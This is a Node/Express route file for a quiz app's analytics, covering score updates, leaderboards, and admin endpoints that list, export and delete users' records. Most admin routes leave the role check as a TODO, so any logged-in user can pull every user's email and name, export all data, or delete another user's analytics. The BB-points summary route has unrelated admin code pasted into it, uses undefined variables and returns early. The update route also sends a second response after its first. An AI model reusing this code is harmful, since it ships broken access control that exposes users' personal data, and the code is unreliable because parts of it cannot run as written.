import mongoose from "mongoose";
import express from "express";
import { authenticateToken } from "../middleware/authMiddleware.js";
import PerformanceAnalytics from "../models/PerformanceAnalytics.js";
import { userModel } from "../models/userModel.js";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = express.Router();

// 📊 Update analytics after quiz completion
router.post('/update-analytics', authenticateToken, async (req, res) => {
  try {
    console.log('📊 Analytics update request:', req.body);
    console.log('👤 User ID:', req.user?.userId);
    
    const {
      quizMode,
      totalQuestions,
      correctAnswers,
      timeSpent,
      questionTimes,
      bbPointsEarned,
      category,
      difficulty
    } = req.body;
    
    const userId = req.user.userId;

    console.log("\n📊 ============ ANALYTICS UPDATE REQUEST ============");
    console.log("👤 User:", userId);
    console.log("📝 Quiz Data:", { quizMode, totalQuestions, correctAnswers, timeSpent });
    
    // ✅ CRITICAL CHECK: BB Points logic
    if (quizMode === 'TIMED') {
      console.log("💰 TIMED MODE: BB Points will be calculated and added to cumulativeScore");
    } else {
      console.log("❌ NON-TIMED MODE:", quizMode, "- NO BB Points will be added to cumulativeScore");
    }

    // Validation
    if (!quizMode || !totalQuestions || correctAnswers === undefined || !timeSpent) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields: quizMode, totalQuestions, correctAnswers, timeSpent"
      });
    }
    
    // Validate quiz mode
    const validModes = ['TIMED', 'UNTIMED', 'ON-THE-GO'];
    if (!validModes.includes(quizMode)) {
      return res.status(400).json({
        success: false,
        message: "Invalid quiz mode. Must be one of: " + validModes.join(', ')
      });
    }
    
    // Find or create analytics record
    let analytics = await PerformanceAnalytics.findOne({ userId });
    
    if (!analytics) {
      console.log('🆕 Creating new analytics record for user:', userId);
      analytics = new PerformanceAnalytics({ userId });
    }

    // Validate numbers
    if (totalQuestions <= 0 || correctAnswers < 0 || correctAnswers > totalQuestions || timeSpent < 0) {
      return res.status(400).json({
        success: false,
        message: "Invalid numeric values in quiz data"
      });
    }
    analytics.timeStats[quizMode] = (analytics.timeStats[quizMode] || 0) + timeSpent;

      // Time per question stats update karo
    if (questionTimes && questionTimes.length > 0) {
      const avgTime = questionTimes.reduce((sum, time) => sum + time, 0) / questionTimes.length;
      const fastest = Math.min(...questionTimes);
      const slowest = Math.max(...questionTimes);
      
      if (!analytics.timePerQuestionStats) {
        analytics.timePerQuestionStats = {
          averageTime: 0,
          fastestTime: 0,
          slowestTime: 0
        };
      }
      
      const totalQuizzes = analytics.totalQuizzesTaken;
      analytics.timePerQuestionStats.averageTime = 
        ((analytics.timePerQuestionStats.averageTime * (totalQuizzes - 1)) + avgTime) / totalQuizzes;
      
      analytics.timePerQuestionStats.fastestTime = 
        analytics.timePerQuestionStats.fastestTime === 0 ? 
        fastest : Math.min(analytics.timePerQuestionStats.fastestTime, fastest);
    
    analytics.timePerQuestionStats.slowestTime = 
      Math.max(analytics.timePerQuestionStats.slowestTime, slowest);
  }
  // Use the model method to update analytics
  // await analytics.updateAfterQuiz({

  // ✅ FIXED: Use updated static method with proper BB Points logic
  const updatedAnalytics = await PerformanceAnalytics.updateWithLastQuiz(userId, {
    quizMode,
    totalQuestions,
    correctAnswers,
    timeSpent,
    questionTimes,
    bbPointsEarned,
    category,
    difficulty
  });

  console.log('✅ Analytics successfully updated');
    
  return res.status(200).json({
    success: true,
    message: 'Analytics updated successfully!',
    analytics: {
      totalQuizzesTaken: updatedAnalytics.totalQuizzesTaken,
      totalQuestionsAttempted: updatedAnalytics.totalQuestionsAttempted,
      totalCorrectQuestions: updatedAnalytics.totalCorrectQuestions,
      accuracyPercentage: updatedAnalytics.accuracyPercentage,
      cumulativeScore: updatedAnalytics.cumulativeScore,
      timeStats: updatedAnalytics.timeStats,
      timePerQuestionStats: updatedAnalytics.timePerQuestionStats,
      lastQuiz: updatedAnalytics.lastQuiz,
      questionTimes: questionTimes || []
    }
  });

  console.log("✅ ============ ANALYTICS UPDATE SUCCESSFUL ============");
    console.log("📈 Final Results:");
    console.log("   - Quiz Mode:", quizMode);
    console.log("   - Total BB Points (cumulativeScore):", updatedAnalytics.cumulativeScore);
    console.log("   - Last Quiz BB Points:", updatedAnalytics.lastQuiz.bbPointsEarned);
    console.log("   - Total Quizzes:", updatedAnalytics.totalQuizzesTaken);
    console.log("   - Accuracy:", updatedAnalytics.accuracyPercentage + "%");
    console.log("============================================\n");

    res.json({
      success: true,
      message: "Analytics updated successfully",
      analytics: {
        totalQuizzesTaken: updatedAnalytics.totalQuizzesTaken,
        totalQuestionsAttempted: updatedAnalytics.totalQuestionsAttempted,
        totalCorrectQuestions: updatedAnalytics.totalCorrectQuestions,
        accuracyPercentage: updatedAnalytics.accuracyPercentage,
        cumulativeScore: updatedAnalytics.cumulativeScore, // BB Points (sirf TIMED se)
        timeStats: updatedAnalytics.timeStats,
        timePerQuestionStats: updatedAnalytics.timePerQuestionStats,
        lastQuiz: updatedAnalytics.lastQuiz // Last quiz data (har mode save hoti hai)
      }
    });

  } catch (error) {
    console.error("❌ Analytics update error:", error);
    res.status(500).json({
      success: false,
      message: 'Failed to update analytics',
      error: error.message
    });
  }
});

// 📱 Get user stats (for mobile app) - 4 main points
router.get('/user-stats', authenticateToken, async (req, res) => {
  try {
    console.log('📈 User stats request for user:', req.user.userId);
    
    const userId = req.user.userId;

    console.log("📊 GET USER STATS REQUEST for user:", userId);

    // Find user analytics
    const analytics = await PerformanceAnalytics.findOne({ userId });

    if (!analytics) {
      console.log('📊 No analytics data found, returning default values');
      return res.status(200).json({
        success: true,
        message: "No analytics data found",
        analytics: {
          totalQuizzesTaken: 0,
          totalQuestionsAttempted: 0,
          totalCorrectQuestions: 0,
          accuracyPercentage: 0,
          cumulativeScore: 0, // BB Points = 0
          timeStats: {
            TIMED: 0,
            UNTIMED: 0,
            'ON-THE-GO': 0
          },
          timePerQuestionStats: {
            averageTime: 0,
            fastestTime: 0,
            slowestTime: 0
          },
          lastQuiz: null
        }
      });
    }
    
    console.log('✅ User stats retrieved');
    
    return res.status(200).json({
      success: true,
      message: "User stats retrieved successfully",
      analytics: {
        totalQuizzesTaken: analytics.totalQuizzesTaken,
        totalQuestionsAttempted: analytics.totalQuestionsAttempted,
        totalCorrectQuestions: analytics.totalCorrectQuestions,
        accuracyPercentage: analytics.accuracyPercentage,
        cumulativeScore: analytics.cumulativeScore, // BB Points (sirf TIMED se)
        timeStats: {
          TIMED: analytics.timeStats.TIMED || 0,
          UNTIMED: analytics.timeStats.UNTIMED || 0,
          'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0
        },
        timePerQuestionStats: analytics.timePerQuestionStats,
        lastQuiz: analytics.lastQuiz // Last quiz data
      }
    });

  } catch (error) {
    console.error("❌ Get user stats error:", error);
    res.status(500).json({
      success: false,
      message: 'Failed to retrieve stats',
      error: error.message
    });
  }
});

// 🔧 Admin: Get all users' analytics with detailed info
router.get('/admin/all-stats', authenticateToken, async (req, res) => {
  try {
    console.log('🔧 Admin all stats request');
    console.log('👤 Requested by user:', req.user?.userId);
    
    // TODO: Add admin role check here
    // const requestingUser = await userModel.findById(req.user.userId);
    // if (requestingUser.role !== 'admin') {
    //   return res.status(403).json({
    //     success: false,
    //     message: 'Access denied. Admin only.'
    //   });
    // }
    
    // Pagination parameters
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const skip = (page - 1) * limit;
    
    // Sorting parameters
    const sortBy = req.query.sortBy || 'lastUpdated';
    const sortOrder = req.query.sortOrder === 'asc' ? 1 : -1;
    
    // Build sort object
    const sortObject = {};
    sortObject[sortBy] = sortOrder;
    
    // Get total count
    const totalCount = await PerformanceAnalytics.countDocuments();
    
    // Get analytics with user details
    const analytics = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName role isVerified createdAt')
      .sort(sortObject)
      .skip(skip)
      .limit(limit)
      .lean();
    
    console.log(`✅ Found ${analytics.length} analytics records`);
    
    // Transform data for admin dashboard
    const transformedAnalytics = analytics.map(analytic => ({
      _id: analytic._id,
      user: analytic.userId ? {
        _id: analytic.userId._id,
        email: analytic.userId.email,
        name: `${analytic.userId.profile?.firstName || ''} ${analytic.userId.profile?.lastName || ''}`.trim() || 'No Name',
        role: analytic.userId.role,
        isVerified: analytic.userId.isVerified,
        joinedAt: analytic.userId.createdAt
      } : null,
      // All 7 points for admin
      totalQuizzesTaken: analytic.totalQuizzesTaken,
      totalQuestionsAttempted: analytic.totalQuestionsAttempted,
      totalCorrectQuestions: analytic.totalCorrectQuestions,
      accuracyPercentage: analytic.accuracyPercentage,
      cumulativeScore: analytic.cumulativeScore,
      timeStats: analytic.timeStats,
      timePerQuestionStats: analytic.timePerQuestionStats,
      lastQuiz: analytic.lastQuiz,
      categoryPerformance: analytic.categoryPerformance ? 
        Object.fromEntries(analytic.categoryPerformance) : {},
      difficultyPerformance: analytic.difficultyPerformance,
      lastUpdated: analytic.lastUpdated,
      createdAt: analytic.createdAt
    }));
    
    return res.status(200).json({
      success: true,
      analytics: transformedAnalytics,
      pagination: {
        currentPage: page,
        totalPages: Math.ceil(totalCount / limit),
        totalCount,
        hasMore: skip + analytics.length < totalCount
      },
      count: transformedAnalytics.length
    });
    
  } catch (error) {
    console.error('❌ Get all stats error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to retrieve analytics',
      error: error.message
    });
  }
});

// ✅ SAME: Get last quiz details route
router.get("/last-quiz", authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;

    console.log("📊 GET LAST QUIZ REQUEST for user:", userId);

    const analytics = await PerformanceAnalytics.findOne({ userId }).select('lastQuiz');

    if (!analytics || !analytics.lastQuiz) {
      return res.json({
        success: true,
        message: "No last quiz data found",
        lastQuiz: null
      });
    }

    console.log("✅ Last quiz data retrieved:");
    console.log("   - Mode:", analytics.lastQuiz.quizMode);
    console.log("   - BB Points:", analytics.lastQuiz.bbPointsEarned);
    console.log("   - Accuracy:", analytics.lastQuiz.accuracy + "%");

    res.json({
      success: true,
      message: "Last quiz data retrieved successfully",
      lastQuiz: analytics.lastQuiz
    });

  } catch (error) {
    console.error("❌ Get last quiz error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to retrieve last quiz data",
      error: error.message
    });
  }
});

// 📊 Admin: Get summary statistics
router.get('/admin/summary', authenticateToken, async (req, res) => {
  try {
    console.log('📊 Admin summary stats request');
    
    // TODO: Add admin role check
    
    // Use aggregation pipeline for efficient calculation
    const summaryPipeline = [
      {
        $group: {
          _id: null,
          totalUsers: { $sum: 1 },
          totalQuizzesTaken: { $sum: "$totalQuizzesTaken" },
          totalQuestionsAttempted: { $sum: "$totalQuestionsAttempted" },
          totalCorrectQuestions: { $sum: "$totalCorrectQuestions" },
          avgAccuracy: { $avg: "$accuracyPercentage" },
          avgCumulativeScore: { $avg: "$cumulativeScore" },
          totalTimedTime: { $sum: "$timeStats.TIMED" },
          totalUntimedTime: { $sum: "$timeStats.UNTIMED" },
          totalTutorTime: { $sum: "$timeStats.TUTOR" },
          totalOnTheGoTime: { $sum: "$timeStats.ON-THE-GO" }
        }
      }
    ];

    // Run the summary pipeline and assign result to summary
    const [summary] = await PerformanceAnalytics.aggregate(summaryPipeline);

    // Total quizzes taken across all users
    const totalQuizzesTaken = await PerformanceAnalytics.aggregate([
      { $group: { _id: null, total: { $sum: "$totalQuizzesTaken" } } }
    ]);
    
    // Total questions attempted across all users
    const totalQuestionsAttempted = await PerformanceAnalytics.aggregate([
      { $group: { _id: null, total: { $sum: "$totalQuestionsAttempted" } } }
    ]);
    
    // Average accuracy across all users
    const averageAccuracy = await PerformanceAnalytics.aggregate([
      { $group: { _id: null, avgAccuracy: { $avg: "$accuracyPercentage" } } }
    ]);
    
    // Mode-wise time distribution
    const modeTimeStats = await PerformanceAnalytics.aggregate([
      {
        $group: {
          _id: null,
          totalTimedTime: { $sum: "$timeStats.TIMED" },
          totalUntimedTime: { $sum: "$timeStats.UNTIMED" },
          totalTutorTime: { $sum: "$timeStats.TUTOR" },
          totalOnTheGoTime: { $sum: "$timeStats.ON-THE-GO" }
        }
      }
    ]);
    
    // Top performers
    const topPerformers = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .sort({ accuracyPercentage: -1 })
      .limit(5)
      .lean();
    
    // Most active users
    const mostActiveUsers = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .sort({ totalQuizzesTaken: -1 })
      .limit(5)
      .lean();
    
    // Category statistics
    const categoryStats = await PerformanceAnalytics.aggregate([
      { $unwind: { path: "$categoryPerformance", preserveNullAndEmptyArrays: true } },
      {
        $group: {
          _id: "$categoryPerformance.k",
          totalAttempted: { $sum: "$categoryPerformance.v.attempted" },
          totalCorrect: { $sum: "$categoryPerformance.v.correct" },
          avgAccuracy: { $avg: "$categoryPerformance.v.accuracy" }
        }
      },
      { $match: { _id: { $ne: null } } },
      { $sort: { totalAttempted: -1 } }
    ]);
    
    return res.status(200).json({
      success: true,
      summary: {
        totalUsersWithAnalytics: summary?.totalUsers || 0,
        totalQuizzesTaken: summary?.totalQuizzesTaken || totalQuizzesTaken[0]?.total || 0,
        totalQuestionsAttempted: summary?.totalQuestionsAttempted || totalQuestionsAttempted[0]?.total || 0,
        totalCorrectQuestions: summary?.totalCorrectQuestions || 0,
        averageAccuracy: Math.round(averageAccuracy[0]?.avgAccuracy || 0),
        averageCumulativeScore: Math.round(summary?.avgCumulativeScore || 0),
        modeTimeDistribution: {
          totalTimedTime: summary?.totalTimedTime || 0,
          totalUntimedTime: summary?.totalUntimedTime || 0,
          totalTutorTime: summary?.totalTutorTime || 0,
          totalOnTheGoTime: summary?.totalOnTheGoTime || 0
        },
        topPerformers: topPerformers.map(p => ({
          userId: p.userId?._id,
          name: `${p.userId?.profile?.firstName || ''} ${p.userId?.profile?.lastName || ''}`.trim() || 'No Name',
          email: p.userId?.email,
          accuracy: p.accuracyPercentage,
          totalQuizzes: p.totalQuizzesTaken
        })),
        mostActiveUsers: mostActiveUsers.map(u => ({
          userId: u.userId?._id,
          name: `${u.userId?.profile?.firstName || ''} ${u.userId?.profile?.lastName || ''}`.trim() || 'No Name',
          email: u.userId?.email,
          totalQuizzes: u.totalQuizzesTaken,
          totalQuestions: u.totalQuestionsAttempted
        })),
        categoryStats
      }
    });
    
  } catch (error) {
    console.error('❌ Get summary stats error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to retrieve summary statistics',
      error: error.message
    });
  }
});

// ✅ ENHANCED: BB Points summary route with better calculations
router.get("/bb-points-summary", authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;

    console.log("🏆 GET BB POINTS SUMMARY REQUEST for user:", userId);

    const analytics = await PerformanceAnalytics.findOne({ userId });

    if (!analytics) {
      return res.json({
        success: true,
        message: "No analytics data found",
        bbPointsSummary: {
          totalBBPoints: 0,
          lastQuizBBPoints: 0,
          timedQuizCount: 0,
          averageBBPointsPerQuiz: 0
        }
      });
    }

    // ✅ BETTER: Calculate timed quiz count from total time and average time
    const totalTime = analytics.timeStats.TIMED + 
                     analytics.timeStats.UNTIMED + 
                     analytics.timeStats['ON-THE-GO'];
    
    const [summary] = await PerformanceAnalytics.aggregate(summaryPipeline);
    
    // Get top performers
    const topPerformers = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .sort({ accuracyPercentage: -1 })
      .limit(5)
      .lean();
    
    // Get most active users
    const mostActiveUsers = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .sort({ totalQuizzesTaken: -1 })
      .limit(5)
      .lean();
    
    // Category statistics
    const categoryStats = await PerformanceAnalytics.aggregate([
      { $unwind: { path: "$categoryPerformance", preserveNullAndEmptyArrays: true } },
      {
        $group: {
          _id: "$categoryPerformance.k",
          totalAttempted: { $sum: "$categoryPerformance.v.attempted" },
          totalCorrect: { $sum: "$categoryPerformance.v.correct" },
          avgAccuracy: { $avg: "$categoryPerformance.v.accuracy" }
        }
      },
      { $match: { _id: { $ne: null } } },
      { $sort: { totalAttempted: -1 } }
    ]);
    
    return res.status(200).json({
      success: true,
      summary: {
        totalUsersWithAnalytics: summary?.totalUsers || 0,
        totalQuizzesTaken: summary?.totalQuizzesTaken || totalQuizzesTaken[0]?.total || 0,
        totalQuestionsAttempted: summary?.totalQuestionsAttempted || totalQuestionsAttempted[0]?.total || 0,
        totalCorrectQuestions: summary?.totalCorrectQuestions || 0,
        averageAccuracy: Math.round(averageAccuracy[0]?.avgAccuracy || 0),
        averageCumulativeScore: Math.round(summary?.avgCumulativeScore || 0),
        modeTimeDistribution: {
          totalTimedTime: summary?.totalTimedTime || 0,
          totalUntimedTime: summary?.totalUntimedTime || 0,
          totalTutorTime: summary?.totalTutorTime || 0,
          totalOnTheGoTime: summary?.totalOnTheGoTime || 0
        },
        topPerformers: topPerformers.map(p => ({
          userId: p.userId?._id,
          name: `${p.userId?.profile?.firstName || ''} ${p.userId?.profile?.lastName || ''}`.trim() || 'No Name',
          email: p.userId?.email,
          accuracy: p.accuracyPercentage,
          totalQuizzes: p.totalQuizzesTaken
        })),
        mostActiveUsers: mostActiveUsers.map(u => ({
          userId: u.userId?._id,
          name: `${u.userId?.profile?.firstName || ''} ${u.userId?.profile?.lastName || ''}`.trim() || 'No Name',
          email: u.userId?.email,
          totalQuizzes: u.totalQuizzesTaken,
          totalQuestions: u.totalQuestionsAttempted
        })),
        categoryStats
      }
    });
    const timedRatio = totalTime > 0 ? analytics.timeStats.TIMED / totalTime : 0;
    const estimatedTimedQuizzes = Math.round(analytics.totalQuizzesTaken * timedRatio);

    const bbPointsSummary = {
      totalBBPoints: analytics.cumulativeScore, // Total BB Points (sirf TIMED se)
      lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,
      timedQuizCount: estimatedTimedQuizzes,
      averageBBPointsPerQuiz: estimatedTimedQuizzes > 0 ? 
        Math.round(analytics.cumulativeScore / estimatedTimedQuizzes) : 0,
      // ✅ BONUS: Additional insights
      timedTimePercentage: Math.round(timedRatio * 100),
      lastQuizMode: analytics.lastQuiz?.quizMode || null
    };

    console.log("✅ BB Points summary retrieved:");
    console.log("   - Total BB Points:", bbPointsSummary.totalBBPoints);
    console.log("   - Last Quiz BB Points:", bbPointsSummary.lastQuizBBPoints);
    console.log("   - Estimated TIMED Quizzes:", bbPointsSummary.timedQuizCount);
    console.log("   - TIMED Time %:", bbPointsSummary.timedTimePercentage + "%");

    res.json({
      success: true,
      message: "BB Points summary retrieved successfully",
      bbPointsSummary
    });

  } catch (error) {
    console.error("❌ Get BB Points summary error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to retrieve BB Points summary",
      error: error.message
    });
  }
});

// 📈 Admin: Get analytics by user ID
router.get('/admin/user/:userId', authenticateToken, async (req, res) => {
  try {
    const { userId } = req.params;
    
    console.log('📈 Admin requesting analytics for user:', userId);
    
    // TODO: Add admin role check
    
    const analytics = await PerformanceAnalytics.findOne({ userId })
      .populate('userId', 'email profile role isVerified createdAt');
    
    if (!analytics) {
      return res.status(404).json({
        success: false,
        message: 'No analytics found for this user'
      });
    }
    
    // Get user's quiz history (last 10 quizzes)
    // This would require storing individual quiz records
    // For now, we return the last quiz details
    
    return res.status(200).json({
      success: true,
      analytics: {
        user: analytics.userId,
        stats: {
          totalQuizzesTaken: analytics.totalQuizzesTaken,
          totalQuestionsAttempted: analytics.totalQuestionsAttempted,
          totalCorrectQuestions: analytics.totalCorrectQuestions,
          accuracyPercentage: analytics.accuracyPercentage,
          cumulativeScore: analytics.cumulativeScore,
          timeStats: analytics.timeStats,
          timePerQuestionStats: analytics.timePerQuestionStats
        },
        lastQuiz: analytics.lastQuiz,
        categoryPerformance: analytics.categoryPerformance ? 
          Object.fromEntries(analytics.categoryPerformance) : {},
        difficultyPerformance: analytics.difficultyPerformance,
        metadata: {
          lastUpdated: analytics.lastUpdated,
          createdAt: analytics.createdAt
        }
      }
    });
    
  } catch (error) {
    console.error('❌ User analytics error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to retrieve user analytics',
      error: error.message
    });
  }
});

// ✅ NEW: Verify BB Points source - Debug endpoint
router.get("/verify-bb-points", authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;

    console.log("🔍 VERIFYING BB POINTS SOURCE for user:", userId);

    const analytics = await PerformanceAnalytics.findOne({ userId });

    if (!analytics) {
      return res.json({
        success: false,
        message: "No analytics found for verification"
      });
    }

    const totalTimeSpent = analytics.timeStats.TIMED + 
                          analytics.timeStats.UNTIMED + 
                          analytics.timeStats['ON-THE-GO'];

    const timedRatio = totalTimeSpent > 0 ? (analytics.timeStats.TIMED / totalTimeSpent) * 100 : 0;

    const verification = {
      cumulativeScore: analytics.cumulativeScore,
      timeStats: {
        TIMED: analytics.timeStats.TIMED || 0,
        UNTIMED: analytics.timeStats.UNTIMED || 0,
        'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0
      },
      timedTimePercentage: timedRatio.toFixed(2) + '%',
      lastQuizMode: analytics.lastQuiz?.quizMode,
      lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,
      totalQuizzes: analytics.totalQuizzesTaken,
      warning: timedRatio < 50 && analytics.cumulativeScore > 0 ? 
        '⚠️ Warning: BB Points detected but TIMED mode time is less than 50%' : 
        '✅ BB Points tracking looks correct',
      recommendation: analytics.cumulativeScore === 0 ? 
        '💡 Take some TIMED quizzes to earn BB Points!' :
        '🎯 Continue taking TIMED quizzes to earn more BB Points'
    };

    console.log("✅ BB Points verification completed:");
    console.log("   - Cumulative Score:", verification.cumulativeScore);
    console.log("   - TIMED Time %:", verification.timedTimePercentage);
    console.log("   - Status:", verification.warning);

    res.json({
      success: true,
      message: "BB Points verification completed",
      verification: verification
    });

  } catch (error) {
    console.error("❌ BB Points verification error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to verify BB Points source",
      error: error.message
    });
  }
});

// 🗑️ Admin: Reset user analytics
router.delete('/admin/reset/:userId', authenticateToken, async (req, res) => {
  try {
    const { userId } = req.params;
    
    console.log('🗑️ Admin resetting analytics for user:', userId);
    
    // TODO: Add admin role check and confirmation
    
    const result = await PerformanceAnalytics.findOneAndDelete({ userId });
    
    if (!result) {
      return res.status(404).json({
        success: false,
        message: 'No analytics found for this user'
      });
    }
    
    console.log('✅ Analytics reset successfully');
    
    return res.status(200).json({
      success: true,
      message: 'User analytics reset successfully'
    });
    
  } catch (error) {
    console.error('❌ Reset analytics error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to reset analytics',
      error: error.message
    });
  }
});

// 📥 Admin: Export analytics data
router.get('/admin/export', authenticateToken, async (req, res) => {
  try {
    console.log('📥 Export analytics request');
    
    // TODO: Add admin role check
    
    const format = req.query.format || 'json';
    
    // Get all analytics data with populated user info
    const analytics = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .lean();
    
    if (format === 'csv') {
      // Convert to CSV format
      const csvHeaders = [
        'User Email',
        'User Name',
        'Total Quizzes',
        'Questions Attempted',
        'Correct Answers',
        'Accuracy %',
        'Cumulative Score',
        'Time in TIMED',
        'Time in UNTIMED',
        'Time in TUTOR',
        'Time in ON-THE-GO',
        'Avg Time per Question',
        'Last Updated'
      ].join(',');
      
      const csvRows = analytics.map(a => [
        a.userId?.email || '',
        `${a.userId?.profile?.firstName || ''} ${a.userId?.profile?.lastName || ''}`.trim() || 'Unknown',
        a.totalQuizzesTaken,
        a.totalQuestionsAttempted,
        a.totalCorrectQuestions,
        a.accuracyPercentage,
        a.cumulativeScore,
        a.timeStats.TIMED,
        a.timeStats.UNTIMED,
        a.timeStats.TUTOR,
        a.timeStats['ON-THE-GO'],
        a.timePerQuestionStats.averageTime.toFixed(2),
        new Date(a.lastUpdated).toISOString()
      ].join(','));
      
      const csv = [csvHeaders, ...csvRows].join('\n');
      
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=analytics_export.csv');
      return res.send(csv);
    }
    
    // Default to JSON
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=analytics_export.json');
    return res.json({
      success: true,
      exportDate: new Date().toISOString(),
      totalRecords: analytics.length,
      data: analytics.map(a => ({
        user: {
          email: a.userId?.email || '',
          name: `${a.userId?.profile?.firstName || ''} ${a.userId?.profile?.lastName || ''}`.trim() || 'Unknown'
        },
        totalQuizzesTaken: a.totalQuizzesTaken,
        totalQuestionsAttempted: a.totalQuestionsAttempted,
        totalCorrectQuestions: a.totalCorrectQuestions,
        accuracyPercentage: a.accuracyPercentage,
        cumulativeScore: a.cumulativeScore,
        timeStats: a.timeStats,
        timePerQuestionStats: a.timePerQuestionStats,
        lastUpdated: a.lastUpdated
      }))
    });
    
  } catch (error) {
    console.error('❌ Export error:', error);
    return res.status(500).json({
      success: false,
      message: 'Failed to export analytics',
      error: error.message
    });
  }
});

// ✅ ENHANCED: Reset analytics route with confirmation
router.delete("/reset-analytics", authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    const { confirm } = req.query;

    console.log("🗑️ RESET ANALYTICS REQUEST for user:", userId);

    if (confirm !== 'true') {
      return res.status(400).json({
        success: false,
        message: "Please add ?confirm=true to confirm analytics reset"
      });
    }

    const result = await PerformanceAnalytics.deleteOne({ userId });

    if (result.deletedCount === 0) {
      return res.json({
        success: true,
        message: "No analytics data found to delete"
      });
    }

    console.log("✅ Analytics data reset successfully");

    res.json({
      success: true,
      message: "Analytics data reset successfully! Start fresh with TIMED mode testing.",
      note: "Take TIMED quizzes to earn BB Points (cumulativeScore)"
    });

  } catch (error) {
    console.error("❌ Reset analytics error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to reset analytics data",
      error: error.message
    });
  }
});

// ✅ SAME: Analytics overview route
router.get("/overview", authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;

    console.log("📊 GET ANALYTICS OVERVIEW REQUEST for user:", userId);

    const analytics = await PerformanceAnalytics.findOne({ userId });

    if (!analytics) {
      return res.json({
        success: true,
        message: "No analytics data found",
        overview: null
      });
    }

    // Calculate additional metrics
    const totalTimeSpent = analytics.timeStats.TIMED + 
                          analytics.timeStats.UNTIMED + 
                          analytics.timeStats['ON-THE-GO'];

    const incorrectQuestions = analytics.totalQuestionsAttempted - analytics.totalCorrectQuestions;

    const overview = {
      basicStats: {
        totalQuizzesTaken: analytics.totalQuizzesTaken,
        totalQuestionsAttempted: analytics.totalQuestionsAttempted,
        totalCorrectQuestions: analytics.totalCorrectQuestions,
        incorrectQuestions,
        accuracyPercentage: analytics.accuracyPercentage,
        cumulativeScore: analytics.cumulativeScore // BB Points
      },
      timeBreakdown: {
        totalTimeSpent,
        timeStats: {
          TIMED: analytics.timeStats.TIMED || 0,
          UNTIMED: analytics.timeStats.UNTIMED || 0,
          'ON-THE-GO': analytics.timeStats['ON-THE-GO'] || 0
        },
        timePerQuestionStats: analytics.timePerQuestionStats
      },
      lastQuizInfo: analytics.lastQuiz,
      timestamps: {
        accountCreated: analytics.createdAt,
        lastUpdated: analytics.lastUpdated
      },
      // ✅ BONUS: BB Points insights
      bbPointsInsights: {
        totalBBPoints: analytics.cumulativeScore,
        lastQuizBBPoints: analytics.lastQuiz?.bbPointsEarned || 0,
        bbPointsSource: 'Only from TIMED mode quizzes'
      }
    };

    console.log("✅ Analytics overview retrieved successfully");

    res.json({
      success: true,
      message: "Analytics overview retrieved successfully",
      overview
    });

  } catch (error) {
    console.error("❌ Get analytics overview error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to retrieve analytics overview",
      error: error.message
    });
  }
});

// ✅ ENHANCED: Leaderboard route with BB Points focus
router.get("/leaderboard", authenticateToken, async (req, res) => {
  try {
    const { limit = 10, mode = 'bb-points' } = req.query;

    console.log("🏆 GET LEADERBOARD REQUEST");
    console.log("📊 Mode:", mode, "Limit:", limit);

    // Build query based on mode
    let sortField = 'cumulativeScore'; // Default sort by BB Points
    if (mode === 'accuracy') sortField = 'accuracyPercentage';
    if (mode === 'questions') sortField = 'totalQuestionsAttempted';
    if (mode === 'quizzes') sortField = 'totalQuizzesTaken';

    const leaderboard = await PerformanceAnalytics.find({})
      .populate('userId', 'email profile.firstName profile.lastName')
      .sort({ [sortField]: -1 })
      .limit(parseInt(limit))
      .select('userId totalQuizzesTaken totalQuestionsAttempted totalCorrectQuestions accuracyPercentage cumulativeScore lastQuiz timeStats');

    const transformedLeaderboard = leaderboard.map((entry, index) => {
      // Calculate TIMED quiz ratio
      const totalTime = entry.timeStats.TIMED + entry.timeStats.UNTIMED + 
                       entry.timeStats['ON-THE-GO'];
      const timedRatio = totalTime > 0 ? (entry.timeStats.TIMED / totalTime) * 100 : 0;

      return {
        rank: index + 1,
        user: {
          _id: entry.userId._id,
          email: entry.userId.email,
          name: `${entry.userId.profile?.firstName || ''} ${entry.userId.profile?.lastName || ''}`.trim() || entry.userId.email.split('@')[0]
        },
        stats: {
          totalQuizzes: entry.totalQuizzesTaken,
          totalQuestions: entry.totalQuestionsAttempted,
          correctAnswers: entry.totalCorrectQuestions,
          accuracy: entry.accuracyPercentage,
          bbPoints: entry.cumulativeScore, // BB Points from TIMED mode only
          lastQuizMode: entry.lastQuiz?.quizMode || null,
          timedModePercentage: Math.round(timedRatio)
        }
      };
    });

    console.log("✅ Leaderboard retrieved successfully");

    res.json({
      success: true,
      message: "Leaderboard retrieved successfully",
      leaderboard: transformedLeaderboard,
      mode,
      count: transformedLeaderboard.length,
      note: "BB Points are earned only from TIMED mode quizzes"
    });

  } catch (error) {
    console.error("❌ Get leaderboard error:", error);
    res.status(500).json({
      success: false,
      message: "Failed to retrieve leaderboard",
      error: error.message
    });
  }
});

